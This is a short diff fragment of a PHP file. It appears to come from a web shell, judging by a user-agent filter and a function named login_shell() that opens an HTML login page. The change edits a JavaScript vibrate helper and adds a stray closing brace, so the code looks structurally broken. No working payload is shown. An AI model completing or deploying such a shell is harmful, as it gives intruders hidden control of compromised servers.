@@ -41,12 +41,11 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
         exit;
     }
 }
-
         function vibra(pola){
             var getaran = window.navigator.vibrate(pola);
             console.log(getaran);
         }
-
+}
 function login_shell() {
 ?>
 <html>
